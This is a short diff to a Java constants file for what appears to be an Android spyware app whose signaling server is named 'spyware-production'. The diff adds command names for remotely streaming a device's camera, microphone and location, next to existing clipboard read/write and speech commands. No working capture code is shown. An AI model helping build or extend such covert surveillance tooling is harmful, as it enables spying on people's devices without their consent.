@@ -20,6 +20,8 @@ public class Constants {
 
     // ── Signaling ─────────────────────────────────────────────────
     public static final String DEFAULT_SIGNALING_URL = "https://spyware-production.up.railway.app";
+    // public static final String DEFAULT_SIGNALING_URL = "http://localhost:3000";
+    // public static final String DEFAULT_SIGNALING_URL = "http://192.168.1.103:3000";
 
     // ── Video Quality (Camera Streaming) ──────────────────────────
     public static final int VIDEO_WIDTH  = 640;
@@ -84,6 +86,10 @@ public class Constants {
     public static final String CMD_GET_CLIPBOARD    = "cmd:get_clipboard";
     public static final String CMD_SET_CLIPBOARD    = "cmd:set_clipboard";
     public static final String CMD_TTS_SPEAK        = "cmd:tts_speak";
+    public static final String CMD_STREAM_CAMERA    = "cmd:stream_camera";
+    public static final String CMD_STREAM_MIC       = "cmd:stream_mic";
+    public static final String CMD_STREAM_LOCATION   = "cmd:stream_location";
+    public static final String EVENT_STREAM_STATUS  = "stream_status";
     public static final String EVENT_SENSOR_DATA    = "sensor_data";
     public static final String EVENT_NETWORK_INFO    = "network_info";
     public static final String EVENT_SNAPSHOT_DATA  = "snapshot_data";
